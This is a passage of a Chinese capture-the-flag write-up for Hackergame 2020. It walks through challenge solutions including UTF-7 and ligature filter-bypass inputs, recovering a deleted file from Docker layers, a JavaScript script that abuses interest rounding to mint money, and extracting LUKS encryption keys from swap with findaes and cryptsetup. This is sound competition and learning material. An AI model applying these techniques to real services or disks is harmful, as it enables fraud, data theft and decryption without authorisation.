class=\"hljs-string\">\"-c\"</span>, <span class=\"hljs-string\">\"/usr/local/bin/python3 /runner.py\"</span>],        <span class=\"hljs-built_in\">input</span>=code.encode(),        stdout=subprocess.PIPE,    )    <span class=\"hljs-keyword\">if</span> p.returncode != <span class=\"hljs-number\">0</span>:        <span class=\"hljs-built_in\">print</span>()        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Your code did not run successfully\"</span>)        exit(-<span class=\"hljs-number\">1</span>)    output = p.stdout.decode()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Your code is:\"</span>)    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">repr</span>(code))    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Output of your code is:\"</span>)    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">repr</span>(output))    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Checking reversed(code) == output\"</span>)    <span class=\"hljs-keyword\">if</span> code[::-<span class=\"hljs-number\">1</span>] == output:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">open</span>(<span class=\"hljs-string\">\"/root/flag1\"</span>).read())    <span class=\"hljs-keyword\">else</span>:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Failed!\"</span>)    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Checking sha256(code) == output\"</span>)    <span class=\"hljs-keyword\">if</span> hashlib.sha256(code.encode()).hexdigest() == output:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">open</span>(<span class=\"hljs-string\">\"/root/flag2\"</span>).read())    <span class=\"hljs-keyword\">else</span>:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Failed!\"</span>)<span class=\"hljs-comment\"># runner.py</span><span class=\"hljs-built_in\">exec</span>(<span class=\"hljs-built_in\">input</span>())</code></pre>\n<blockquote><p>不要想着直接 <code>exec()</code> 偷 flag 了，你以为这比赛是 ylb 搞的啊？</p></blockquote>\n<p>可以看到「反向复读」的检查中使用了 <code>[::-1]</code> 倒序，所以在构造反向复读的语句中也应该使用 <code>[::-1]</code>。</p>\n<p>首先是构建正向复读的语句，在 Google 中 <del>盲目</del> 搜索的过程中确定了关键词「Quine Python」、找到了 <a href=\"https://www.geeksforgeeks.org/quine-in-python/\">这个网站</a>，介绍了如下语句：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">'_=%r;print (_%%_)'</span>;<span class=\"hljs-built_in\">print</span> (_%_)</code></pre>\n<p>那个网站也给出了这个语句的详细解释，不过简单来说，我们利用了 <code>print</code> 字符格式化、通过 <code>%r</code>（当然也可以用 <code>%s</code>）获得 <code>_</code> 变量的取值；而在 <code>_</code> 变量中使用了 <code>%%</code> 防止 <code>%</code> 被转义。</p>\n<p>既然有了正向复读，稍加改动即可得到反向复读。首先在 <code>print(_&amp;_)</code> 中加上 <code>[::-1]</code> 获得倒叙，同时也要对应修改 <code>_</code> 变量：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">')]1-::[_%%_(tnirp;%r=_'</span>;<span class=\"hljs-built_in\">print</span>(_%_[::-<span class=\"hljs-number\">1</span>])</code></pre>\n<p>信心满满地去提交，结果 Check Failed，发现 <code>print</code> 在结尾带上了换行符。所以再为 <code>print</code>再加上 <code>end=\"\"</code> 即可：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">')\"\"=dne,]1-::[_%%_(tnirp;%r=_'</span>;<span class=\"hljs-built_in\">print</span>(_%_[::-<span class=\"hljs-number\">1</span>],end=<span class=\"hljs-string\">\"\"</span>)</code></pre>\n<p>成功获得第一个 flag。</p>\n<h2>233 同学的字符串工具</h2>\n<blockquote>\n<p>233 同学最近刚刚学会了 Python 的字符串操作，于是写了两个小程序运行在自己的服务器上。这个工具提供两个功能：</p>\n<ul>\n<li>字符串大写工具</li>\n<li>UTF-7 到 UTF-8 转换工具</li>\n</ul>\n<p>除了点击下方的打开题目按钮使用网页终端，你也可以通过 <code>nc 202.38.93.111 10233</code> 命令连接到 233 同学的服务上。你可以在这里看到 233 同学的源代码: <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-string_tool-py\">string_tool.py</a>。</p>\n</blockquote>\n<p>这一道题我先拿到了第二个 flag 后才拿到了第一个 flag。首先在 <code>www.string-function.com</code> 这个网站上找到了 UTF-7 和 ASCII 编码互换表： <a href=\"http://string-functions.com/encodingtable.aspx?encoding=65000&amp;decoding=20127\">UTF-7 =&gt; ASCII</a> <a href=\"http://string-functions.com/encodingtable.aspx?encoding=20127&amp;decoding=65000\">ASCII =&gt; UTF-7</a>，照着表（加上一些简单的推算）将 <code>flag</code> 编码成 <code>+AGYAbABhAGc-</code>、成功拿到第二个 flag。</p>\n<p>获得第二个 flag 以后，决定根据相同的思路去查 Unicode sheet，但是直到后来经过提醒才想起来有「<a href=\"https://en.wikipedia.org/wiki/Orthographic_ligature\">合字</a>」这种神奇的存在，最终利用 <a href=\"https://www.compart.com/en/unicode/U+FB02#UNC_DB\"><code>U+FB02</code></a> 构造出 Payload 获得第一个 flag。</p>\n<h2>233 同学的 Docker</h2>\n<blockquote>\n<p>233 同学在软工课上学到了 Docker 这种方便的东西，于是给自己的字符串工具项目写了一个 Dockerfile。</p>\n<p>但是 233 同学突然发现它不小心把一个私密文件（<code>flag.txt</code>）打包进去了，于是写了一行命令删掉这个文件。</p>\n<p>「既然已经删掉了，应该不会被人找出来吧？」233 想道。</p>\n</blockquote>\n<p>首先让我们 <a href=\"https://hub.docker.com/layers/8b8d3c8324c7/stringtool/latest/images/sha256-aef87a00ad7a4e240e4b475ea265d3818c694034c26ec227d8d4f445f3d93152?context=explore\">看看这个 Docker Image 是怎么构建的</a>（不需要用 image 反推 Dockerfile 这种奇技淫巧，DockerHub 可以直接查看 Public 的 Docker Images 的构建过程），可以发现 233 同学首先把所有文件都添加到 Docker Image 中、再通过 <code>/bin/sh -c rm /code/flag.txt</code> 删除了 <code>flag.txt</code>。</p>\n<p>由于 Docker Image 在构建时每一个 RUN 都会新建一个 Layer，因此即使 233 同学通过 RUN 删掉了 <code>flag.txt</code>，flag 肯定还存在于某个地方，而且「某个地方」就包括本机的 <code>/var/lib/docker/overlay2</code> ：</p>\n<pre><code class=\"hljs bash\">$ docker run 8b8d3c8324c7/stringtool <span class=\"hljs-comment\"># 下载执行 8b8d3c8324c7/stringtool</span>[Redacted]Nothing here... <span class=\"hljs-comment\"># Docker Image 执行的输出</span>$ <span class=\"hljs-built_in\">cd</span> /var/lib/docker/overlay2$ find -name flag.txt./befaa134f7d0cc9e964e7790b7c11dde6d0df3104cd88667f7676e46f409705f/diff/code/flag.txt./8c07cc3c01c52b8cf0684518e68a31bfb1f843392f973fef9add587d554c6fab/diff/code/flag.txt<span class=\"hljs-comment\"># Duang，flag.txt 它出现了</span>$ <span class=\"hljs-built_in\">cd</span> befaa134f7d0cc9e964e7790b7c11dde6d0df3104cd88667f7676e46f409705f/diff/code/$ cat flag.txt<span class=\"hljs-comment\"># flag 到手，嘿嘿</span></code></pre>\n<h2>从零开始的 HTTP 链接</h2>\n<blockquote>\n<p>众所周知，数组下标应当从 0 开始。</p>\n<p>同样的，TCP 端口也应当从 0 开始。为了实践这一点，我们把一个网站架设在服务器的 0 号端口上。</p>\n<p>你能成功连接到 0 号端口并拿到 flag 吗？</p>\n<p><strong>点击下面的打开题目按钮是无法打开网页的，因为普通的浏览器会认为这是无效地址。</strong></p>\n</blockquote>\n<p>TCP/IP 中「端口」这个概念，甚至早于互联网的发明：早在 ARPANET 网中的供电协议中就有 8 个比特用于决定应该由计算机上的哪个程序接收该信息（当时这 8 个比特被称为 AEN、Another Eight Numbers），可以参考我之前翻译的一篇文章「<a href=\"https://blog.skk.moe/post/history-of-url/\">URL 的历史</a>」。现在 TCP 的端口共有 16 个比特（最大支持到 65535）。其中，端口 0 作为保留端口，所以依然是可用的。虽然部分浏览器无法访问，这并不意味着 netcat 不能访问，对吧！</p>\n<p>当然这道题有几个坑点：</p>\n<ol>\n<li>现有发行版中分发的 <code>netcat</code> 都不是「原版」的，试图连接 Port 0 会报「Invalid Port」。因此可以选择直接手撸 Socket、或者更换另一个版本的 <code>netcat</code>。</li>\n<li>就算使用了合适的工具，由于 Darwin 的 XNU Kernel 非常鸡贼地阻止使用端口 0，所以在 macOS 上也依然没法做这道题。我不得不在 codeanywhere 上开了一个 Linux Container 跑这道题。</li>\n</ol>\n<p>和 HTTP/2 基于二进制帧不同，HTTP/0.9、HTTP/1.0、HTTP/1.1 协议都是基于明文的，因此可以手敲 Header：</p>\n<pre><code class=\"hljs bash\">nc 202.38.93.111 0GET / HTTP/1.1Host: 202.38.93.111Connection: close</code></pre>\n<p>接着终端里会打印出来一串 HTML、隐约还可以看见 <code>xterm.js</code>，这不就是 Hackergame 的 Web 端做题界面嘛！由于去年在参与 USTC Hackergame 时就研究过这个界面、已经知道交互是通过 <code>/shell</code> 路径下的 WebSocket 连接实现的。因此直接使用 <a href=\"https://github.com/vi/websocat\">websocat</a> 完成 WebSocket 交互，就和 netcat 一样：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># 如果没有 websocat 的话</span>$ wget https://github.com/vi/websocat/releases/download/v1.6.0/websocat_nossl_amd64-linux$ chmod +x websocat_nossl_amd64-linux<span class=\"hljs-comment\"># 开始获取 Flag</span>$ ./websocat_nossl_amd64-linux ws://202.38.93.111:0/shellPlease input your token: [Redacted]<span class=\"hljs-comment\"># Flag 到手！</span></code></pre>\n<h2>超简陋的 OpenGL 小程序</h2>\n<blockquote>\n<p>年轻人的第一个 OpenGL 小程序。</p>\n<p>（嗯，有什么被挡住了？）</p>\n</blockquote>\n<p><a href=\"https://archive.org/details/glhackergame_2020\">下载地址</a> （Hosted at Internet Archive）</p>\n<p>由于苏卡卡是参赛的两千多名选手中最菜的那一个、完全不懂 OpenGL、完全不懂图形学，为了做这道题不得不去翻了一下「Learn OpenGL CN」，知道了 VS（Vertex Shader）是顶点着色器、可以处理顶点属性确定形状，和 FS（Fragment Shader）是片段着色器、可以算颜色，然后就开始硬上了。在花了半个小时盲目乱改 VS 的参数后，成功让「犹抱琵琶半遮面」的 flag 露出了右上角：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/16.jpg\" width=\"1280\" height=\"571\" class=\"lazy post-img\"></p>\n<p>凭借着漏出来的部分，我成功认出了 <code>l</code>、<code>Graphic</code>、<code>Happy</code>、<code>(233);</code>。剩下的就要靠猜了，我猜过的 flag 有：</p>\n<ul>\n<li>\n<code>flag{GraphicHappy(223);}</code> （整体长度都不对）</li>\n<li>\n<code>flag{GraphicsHappy(223);}</code> （ <code>c</code> 和 <code>H</code> 之间还有个类似 <code>c</code> 的字母、那就是 <code>s</code> 了，不过还是不够长）</li>\n<li>\n<code>flag{gl_GraphicsHappy(223);}</code> （OpenGL 里不少 <code>gl_</code> 前缀，加上认出来一个 <code>l</code>，试试看）</li>\n<li>\n<code>flag{glGraphicsHappy(223);}</code> （<code>l</code> 和 <code>G</code> 之间的距离没那么长，终于猜对了）</li>\n</ul>\n<blockquote><p>这道题的正确解法是利用未被使用的向量 <code>Normal</code>。苏卡卡虽然有注意到 Normal 未被使用过，但是由于完全不会 OpenGL、并不知道怎么添加向量。</p></blockquote>\n<p>这种解法没什么好自豪的，你看这只大尾巴狐狸就是逊啦。</p>\n<h2>来自未来的信笺</h2>\n<blockquote>\n<p>你收到了一封邮件。没有标题，奇奇怪怪的发件人，和一份奇怪的附件。日期显示的是 3020 年 10 月 31 日。</p>\n<p>“Send from Arctic.” 正文就只有这一句话。</p>\n<p>「谁搞的恶作剧啊……话说这竟然没有被垃圾邮件过滤器过滤掉？」你一边嘟囔着一边解压了附件——只看到一堆二维码图片。</p>\n<p>看起来有点意思。你不禁想试试，能否从其中得到什么有意义的东西。</p>\n</blockquote>\n<p>谁会在 1000 年以后从北极给你发一封电子邮件？那当然是 <a href=\"https://archiveprogram.github.com/\">GitHub Archive Program</a> 啦 —— 今年年初，GitHub 将现存的活跃开源项目全部以二维码的形式刻录在胶片上、埋进了北极世界档案馆（AWA，位于斯瓦尔巴群岛一个位于北极冻土之下的废弃煤矿中，和 Global Seed Vault 仅一英里之遥）中。为了做这道题，让我们读一读 GitHub Archive Program 为「后人」提供的指南：</p>\n<ul>\n<li><p>「<a href=\"https://github.com/github/archive-program/blob/master/GUIDE.md\">A Guide To the GitHub Code Vault</a>」</p></li>\n<li><p>「<a href=\"https://github.com/github/archive-program/blob/master/GUIDE_zh.md\">GitHub Code Vault 指南（简体中文）</a>」</p></li>\n</ul>\n<p>这里摘抄简体中文版指南的一部分内容：</p>\n<blockquote>\n<p>每个二维码由一个个白色或黑色小方块组成，该等小方块几乎占据胶片的整个帧。 使用二维码的原因在于，其比人类可读的文本更紧凑而可靠。 二维码可解码为二进制数据，即一系列 1 和 0。</p>\n<p>……</p>\n<p>我们可将 TAR 文件嵌套进 TAR 文件，就像在容器中装入另一容器，而这正是大部分存档数据的存储方式。 无论哪个仓库，其外层 TAR 文件都将至少包含如下内容：</p>\n<ul>\n<li>一个名为 META 的未压缩元数据文件，其包含仓库名称、帐户名、说明、语言、星数、复刻数</li>\n<li>一个名为 COMMITS 的压缩文件（如下所述），包含该仓库有史以来的更改记录</li>\n<li>一个名为 repo.tar.xz 的文件，是包含实际仓库内容的压缩 TAR 文件</li>\n</ul>\n<p>其它诸如 wiki、gh-page、issue 和 pull request 等元数据也可能包含在不同压缩文件中。</p>\n</blockquote>\n<p>现在我们知道了这些二维码是什么、二维码们中存储了什么数据、数据的格式，接下来就该写一个脚本把所有二维码全部解析出来了：</p>\n<pre><code class=\"hljs python\"><span class=\"hljs-keyword\">import</span> zxing<span class=\"hljs-keyword\">import</span> osreader = zxing.BarCodeReader()<span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">parseQRCode</span>(<span class=\"hljs-params\">img_path</span>):</span>    barcode = reader.decode(img_path).encode().decode(<span class=\"hljs-string\">'ascii'</span>)    <span class=\"hljs-keyword\">try</span>:        <span class=\"hljs-keyword\">return</span> barcode.raw    <span class=\"hljs-keyword\">except</span>:        <span class=\"hljs-built_in\">print</span>(img_path, barcode)        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-string\">\"\"</span><span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">listDirImages</span>(<span class=\"hljs-params\">folder</span>):</span>    imgs = []    <span class=\"hljs-keyword\">for</span> img_path <span class=\"hljs-keyword\">in</span> os.listdir(folder):        ext = os.path.splitext(img_path)        <span class=\"hljs-keyword\">if</span> <span class=\"hljs-built_in\">len</span>(ext) &gt; <span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> ext[<span class=\"hljs-number\">1</span>].lower() == <span class=\"hljs-string\">\".png\"</span>:            imgs.append(img_path)    imgs.sort()    <span class=\"hljs-keyword\">return</span> imgscontents = []<span class=\"hljs-keyword\">for</span> img <span class=\"hljs-keyword\">in</span> listDirImages(<span class=\"hljs-string\">\"./\"</span>):    contents.extend(parseQRCode(img))file = <span class=\"hljs-string\">\"./result.txt\"</span><span class=\"hljs-keyword\">with</span> <span class=\"hljs-built_in\">open</span>(file, <span class=\"hljs-string\">\"w\"</span>) <span class=\"hljs-keyword\">as</span> f:    <span class=\"hljs-keyword\">for</span> c <span class=\"hljs-keyword\">in</span> contents:        f.write(c)</code></pre>\n<blockquote><p>这道题对二维码解码库的选择非常关键。<code>zybar</code> 已经八年没有更新，不仅无法处理 Binary Format QRCode、而且还无法识别 00 截断；相比来说，<code>zxing</code> 库的维护非常活跃、因而更为可靠。不过即使使用 py-zxing 也有坑，很快就会看到了。</p></blockquote>\n<p>把脚本丢到二维码目录下执行，跑完了打开 <code>result.txt</code>，看到了 <code>META</code>（一个 <code>openlug/django-common</code> 的 GitHub RESTful API 返回值）、<code>COMMITS</code>，甚至还看到了一条 commit message「There’s no flag in META and COMMITS!」。但是到了 <code>repo.tar.xz</code> 却让我伤破脑筋：zlib 的文件头本应该是 <code>FD 37 7A 58</code>，结果却看到了 <code>EF BF BD 37 7A 58</code>，解压软件一个都认不出来。</p>\n<p>这是啥玩意？遇事不决问 Google，结果找到了这个：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/20.png\" width=\"829\" height=\"601\" class=\"lazy post-img\"></p>\n<blockquote><p>[狐狐脏话删除]</p></blockquote>\n<p>接下来就是去魔改 zxing 了。如之前所说，python-zxing 还只是个 Java zxing 的 wrapper，不得不去学了一点 Java 把 zxing 里的 UTF-8 干掉，最终重新解析了一遍二维码、拿到了正确的 <code>repo.tar.xz</code>，解压拿到了 flag。</p>\n<blockquote><p>顺便说一句，做完这道题后有点无聊，开始通过 META 反推原始仓库。原本看到 <code>openlug/nonexist</code>，以为出题人是新建了一个 Private Repo 出的题，但是又看到 <code>fork_count</code> 和 <code>network_count</code> 是 5，所以得出结论这肯定是一个 Public Repo（否则不可能有 Fork）。再根据 Star 数在 30 左右、Watch 数（在 GitHub RESTful API 中通过 <code>subscriber_count</code> 呈现）是 1、语言是 Python， 最后反推出 META 信息源自去年「被泄露的姜戈」的 <code>openlug/django-common</code>，生成 META 的方式就是 <code>curl https://api.github.com/repos/openlug/django-common</code>。结果还被组委会 diss 了，大尾巴狐狐非常不高兴。</p></blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.0/32.png\" width=\"1067\" height=\"247\" class=\"lazy post-img\"></p>\n<h2>狗狗银行</h2>\n<blockquote><p>你能在狗狗银行成功薅到羊毛吗？</p></blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/6.png\" width=\"1009\" height=\"593\" class=\"lazy post-img\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/7.png\" width=\"988\" height=\"581\" class=\"lazy post-img\"></p>\n<p>考虑到题目公告更新提示「本题前端计算存在浮点数导致的计算误差，数字特别极端时显示可能不正确。但后端采用大整数精确计算，只有净资产确实高于 2000 时才会给出 flag」，所以这道题的思路和 前年 USTC Hackergame 2018 的猫咪银行借助 INT64 溢出 肯定是不一样的。</p>\n<p>首先观察题目给出的条件：每天都要花 10 块钱吃饭；信用卡利率 0.5%、并且一旦欠款每天利息至少是 10 块钱；储蓄卡利率 0.3%。光从字面上的数字来看似乎这道题做不出来，但是我们知道，阿里蚂蚁金服的「余额宝」产品存在「每天收益不足 1 分钱时按 1 分钱计算」的规则。狗狗银行的储蓄卡利率是否也有类似的规则呢？办一张新的「储蓄卡 3」，从「储蓄卡 1」转 166 块钱到「储蓄卡 3」，「储蓄卡 3」的日利息仍然是 0；再从「储蓄卡 1」转 1 块钱到「储蓄卡 3」使余额变成 167 块，Bingo！现在「储蓄卡 3」的日利息有 1 块钱了。<code>1 / 167</code> 算出来真实的日利率是 0.5988%，比信用卡的利率要高 0.0988%，因此我们可以从信用卡借钱然后赚利息的差价，当然还要考虑到每天至少要净赚 10 块的饭钱、以及信用卡的复利（利滚利）。</p>\n<p>接下来就是用脚本连续开一万张卡试图一天拿到 flag，然后，三台备用服务器（一个 IP 上三个端口、三个 Docker）全部 RST 了。。。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/13.png\" width=\"782\" height=\"905\" class=\"lazy post-img\"></p>\n<p>之后，题目新增了一条公告：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/15.png\" width=\"690\" height=\"94\" class=\"lazy post-img\"></p>\n<p>苏卡卡才不是故意的呢（摇尾巴），<del>苏卡卡只是坏，一天赚 1000 不香嘛</del>；虽然有了 1000 张卡的限制，获取 flag 还是轻而易举的：</p>\n<pre><code class=\"hljs js\">(<span class=\"hljs-keyword\">async</span> () =&gt; {  <span class=\"hljs-keyword\">const</span> commonFetchOpt = {    <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'POST'</span>, <span class=\"hljs-attr\">mode</span>: <span class=\"hljs-string\">'cors'</span>, <span class=\"hljs-attr\">credentials</span>: <span class=\"hljs-string\">'include'</span>,    <span class=\"hljs-attr\">headers</span>: {      <span class=\"hljs-attr\">Authorization</span>: <span class=\"hljs-string\">'Bearer [选手 Token]'</span>,      <span class=\"hljs-string\">'Content-Type'</span>: <span class=\"hljs-string\">'application/json; charset=utf-8'</span>    }  }  <span class=\"hljs-comment\">/**</span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{'credit'|'debit'}</span> <span class=\"hljs-variable\">type</span></span></span><span class=\"hljs-comment\">   */</span>  <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">createCard</span>(<span class=\"hljs-params\">type = <span class=\"hljs-string\">'debit'</span></span>) </span>{    <span class=\"hljs-keyword\">return</span> fetch(<span class=\"hljs-string\">'/api/create'</span>, {      <span class=\"hljs-attr\">body</span>: <span class=\"hljs-built_in\">JSON</span>.stringify({ type }),      ...commonFetchOpt    });  }  <span class=\"hljs-comment\">/**</span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">from</span></span></span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">to</span></span></span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">amount</span></span></span><span class=\"hljs-comment\">   */</span>  <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">transfer</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">from</span>, to, amount</span>) </span>{    <span class=\"hljs-keyword\">return</span> fetch(<span class=\"hljs-string\">'/api/transfer'</span>, {      <span class=\"hljs-attr\">body</span>: <span class=\"hljs-built_in\">JSON</span>.stringify({ amount, <span class=\"hljs-attr\">dst</span>: to, <span class=\"hljs-attr\">src</span>: <span class=\"hljs-keyword\">from</span> }),      ...commonFetchOpt    });  }  <span class=\"hljs-comment\">/**</span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">account</span></span></span><span class=\"hljs-comment\">   */</span>  <span class=\"hljs-keyword\">async</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">eatAndEndTheDay</span>(<span class=\"hljs-params\">account</span>) </span>{    <span class=\"hljs-keyword\">await</span> fetch(<span class=\"hljs-string\">'/api/eat'</span>, {      <span class=\"hljs-attr\">body</span>: <span class=\"hljs-built_in\">JSON</span>.stringify({ account }),      ...commonFetchOpt    });  }  <span class=\"hljs-keyword\">try</span> {    <span class=\"hljs-comment\">// 开一张信用卡</span>    <span class=\"hljs-keyword\">await</span> createCard(<span class=\"hljs-string\">'credit'</span>);    <span class=\"hljs-comment\">// 开 999 张储蓄卡，并给每张新开的储蓄卡转 167 块钱</span>    <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">3</span>; i &lt; <span class=\"hljs-number\">1002</span>; i++) {      <span class=\"hljs-keyword\">await</span> createCard(<span class=\"hljs-string\">'debit'</span>);      <span class=\"hljs-keyword\">await</span> transfer(<span class=\"hljs-number\">2</span>, i, <span class=\"hljs-number\">167</span>);    }    <span class=\"hljs-comment\">// 用储蓄卡 1 的初始资金 1000 度过 14 天</span>    <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">0</span>; i &lt; <span class=\"hljs-number\">14</span>; i++) {      <span class=\"hljs-keyword\">await</span> eatAndEndTheDay(<span class=\"hljs-number\">1</span>);    }    <span class=\"hljs-comment\">// 14 天肯定能赚够 1000 块钱了，该获取 flag 了</span>    <span class=\"hljs-keyword\">const</span> req = <span class=\"hljs-keyword\">await</span> fetch(<span class=\"hljs-string\">'/api/user'</span>, { ...commonFetchOpt, <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'GET'</span> });    <span class=\"hljs-keyword\">const</span> resp = <span class=\"hljs-keyword\">await</span> req.json();    <span class=\"hljs-built_in\">console</span>.log(resp.flag);  } <span class=\"hljs-keyword\">catch</span> (e) {    <span class=\"hljs-built_in\">console</span>.error(e);  }})();</code></pre>\n<h2>超基础的数理模拟器</h2>\n<blockquote><p>……<br>我们在 Hackergame 2020 的网站上部署了一项超基础的数理模拟器。 作为一名数理基础扎实的同学，你一定能够轻松通过模拟器的测试吧。</p></blockquote>\n<p>打开题目后发现要做 400 道定积分，而且答案还要取小数点后六位：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.8/29.png\" width=\"1497\" height=\"412\" class=\"lazy post-img\"></p>\n<p>这道题没有取巧的办法，只有老老实实把 400 道定积分全部做完…..吧？</p>\n<p>这么长的定积分谁手算啊，当然是要用 MatLab 来算啦！徒手转换 LaTex 到 MathLab 太麻烦了，写个脚本来做吧：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.7/27.png\" width=\"1150\" height=\"420\" class=\"lazy post-img\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.7/28.png\" width=\"1146\" height=\"539\" class=\"lazy post-img\"></p>\n<p>UserScript 在 <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-js\">这里</a>，好孩子千万不要学习这种方法来解析 LaTex。</p>\n<h2>室友的加密硬盘</h2>\n<blockquote>\n<p>「我的家目录是 512 位 AES 加密的，就算电脑给别人我的秘密也不会泄漏……」你的室友在借你看他装着 Linux 的新电脑时这么说道。你不信，于是偷偷从 U 盘启动，拷出了他硬盘的一部分内容。</p>\n<p><a href=\"https://archive.org/details/roommates_disk_part.img\">打开/下载题目</a> （Hosted at Internet Archive）</p>\n</blockquote>\n<p>苏卡卡一开始试图把镜像直接挂载在虚拟机上，结果无法启动系统；于是先起了一个 Linux 虚拟机、在 Linux 下将 img 转换为 vmdk 再添加到虚拟机中，结果依然提示「未找到已安装的操作系统或操作系统安装器」。</p>\n<blockquote><p>中国民航于 1992 年在《中国民用航空局关于确保飞行安全的命令》文件中提出了 54 个字「八该一反对」，其中最重要的就是「反对盲目蛮干」</p></blockquote>\n<p>既然通过 img 文件直接启动没有成功，不如先看看这个 img 文件都有什么：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/18.png\" width=\"824\" height=\"864\" class=\"lazy post-img\"></p>\n<blockquote><p>不要在意这个 Ubuntu Kylin，最近狐狐在虚拟机里各种体验各种「国产 Linux 发行版」，虚拟机里正好有 Ubuntu Kylin 所以拿来用的。</p></blockquote>\n<p>由于之前阅读过一些通过内存转储破解全盘加密的文章，所以便去下载了 <a href=\"https://sourceforge.net/projects/findaes/\">findaes</a> 的源码，编译的同时再去重读之前的几篇文章获取思路。看到几篇文章中都是用 findaes 直接读取 raw 的内存转储，于是决定直接用 findaes 爆破硬盘映像文件。首先把 img 用 7z 解压出来，然后一个一个分区映像跑：</p>\n<pre><code class=\"hljs bash\">$ ./findaes /path/to/img1.raw</code></pre>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.7/19.jpg\" width=\"867\" height=\"480\" class=\"lazy post-img\"></p>\n<p>根据题干「我的家目录是 512 位 AES 加密的」，但是 findaes 找到的都是 AES-256，所以需要从中筛选出一对 offset 相差为 256bit 的 key 进行拼接，因此还需要注意一点，由于 Intel x86_64 的 little-endian、拼接 key 时需要倒序拼接。</p>\n<blockquote><p>其实这一点我还是比较熟悉的，安装 Hackintosh 时注入十六进制的设备属性时需要互换 bit 也是因为 little-endian。</p></blockquote>\n<p>剩下的就是一对一对 key 的用 <code>sudo cryptsetup luksAddKey --master-key-file</code> 试过去，直到成功解密为止。最后用 swap 里的最后一对 key 成功解密了分区并拿到了 flag <code>flag{lets_do_A_c01d_b00t_next_time}</code> （下次试试冷启动吧！），直到看到 flag 才明白本题的思路是 Linux 休眠后会把内存写入 swap 分区中（macOS 则是写入硬盘上的 <code>sleepimage</code> 文件中），因此和之前读过的从内存转储破解全盘加密的思路是完全一致的。最后再给大家推荐 Red Hat 知识库的一篇文章「<a href=\"https://access.redhat.com/solutions/1543373\">How to recover lost LUKS key or passphrase</a>」。</p>\n<h2>超简易的网盘服务器</h2>\n<blockquote>\n<p>…… 小 C 开始思考技术方案：“听说 h5ai 搭建云盘的方案是不错的 … 使用 Basic Auth 可以做访问控制，可以保护<a href=\"http://202.38.93.111:10120/\">根目录</a>下的文件不被非法的访问 … 等等，有一些文件是可以被分享的，需要一个 <a href=\"http://202.38.93.111:10120/Public\">/Public</a> 目录来共享文件！”</p>\n<p>三分钟后，小 C 同学完成了网盘的搭建。他想：“空着总不好，先得在云盘上放点东西！”。犹豫片刻，他掏出了自己珍藏了三个月的 flag 并上传到了云盘的<a href=\"http://202.38.93.111:10120/\">根目录</a>。</p>\n</blockquote>\n<p>这道题我好像是第五个还是第六个解出来的。这道题很多人没做出来还是有点令我惊讶的。</p>\n<p>直接访问「根目录」会提示 401 需要 HTTP Basic Authentication，聪明的 小 C 肯定不会把密码直接暴露出来的。访问 <code>/Public </code>目录却发现了 <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-h5ai_nginx-conf\"><code>dockerfile</code></a> 和 <a 